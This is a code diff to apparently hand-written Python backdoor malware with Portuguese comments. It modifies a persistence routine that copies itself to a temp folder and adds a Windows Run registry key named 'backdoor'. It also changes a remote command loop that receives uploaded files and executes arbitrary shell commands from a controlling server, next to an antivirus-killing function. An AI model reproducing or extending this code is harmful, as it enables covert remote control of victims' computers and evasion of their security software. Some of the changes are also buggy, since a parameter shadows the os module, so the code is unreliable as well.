@@ -45,11 +45,15 @@ def kill_antivirus():
                 subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
 
-def persistencia():
-    if(not os.getcwd() == TEMPDIR):
-        subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-        FNULL = open(os.devnull,'w')
-        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
+def persistencia(os):
+    if(os == 'nt'):
+        if(not os.getcwd() == TEMPDIR):
+            subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+            FNULL = open(os.devnull,'w')
+            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
+
+    elif(os == 'posix'):
+        pass
 
 def conecta(IP, PORT):
     try:
@@ -63,22 +67,28 @@ def conecta(IP, PORT):
 def executa(socket):
     while True:
         try:
-            dados = socket.recv(1024)
+            dados = socket.recv(1)
             if(not dados): # servidor desconectou, recomeça
                 return
             else:
-                print(dados)
+                #print(dados)
                 try:
-                    if(dados=='upload'): # upload
+                    if(dados=='1'): # upload
                         print('recebendo arquivo')
-                        nome_arquivo = socket.recv(1024)
+                        l = socket.recv(1024)
+                        nome_arquivo = l.split('+/-')[0]
+                        print(nome_arquivo)
                         f = open(nome_arquivo,'wb')
-                        l = socket.recv(512)
+                        l = l.split('+/-')[1]
+                        j = socket.recv(1024)
+                        l = l + j
                         while (l):
                             f.write(l)
-                            l = sc.recv(512)
+                            l = sc.recv(1024)
+                        f.close()
+                        print('recebido')
 
-                    elif(dados=='shell'): # shell
+                    elif(dados=='2'): # shell
                         while True:
                             dados = socket.recv(1024)
                             if(not dados or dados=='exit'):
@@ -101,15 +111,17 @@ def executa(socket):
                                     comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                                     retorno = comando.stdout.read() + comando.stderr.read()
                                     if(retorno == ''):
-                                        socket.send('criado')
+                                        socket.send('feito')
                                     else:
                                         socket.send(retorno)
 
-                    elif(dados=='download'):
+                    elif(dados=='3'): # Download
                         pass
-                    elif(dados=='killav'):
+                    elif(dados=='4'): # Killav
                         #kill_antivirus()
                         pass
+                    else:
+                        print(dados)
 
                 except:
                     return
@@ -127,6 +139,8 @@ def main():
             time.sleep(5)
 
 if __name__=='__main__':
-    if(not os.name == 'posix'):
-        persistencia()
+    if(os.name == 'nt'):
+        persistencia('nt')
+    elif(os.name == 'posix'):
+        persistencia('posix')
     main()
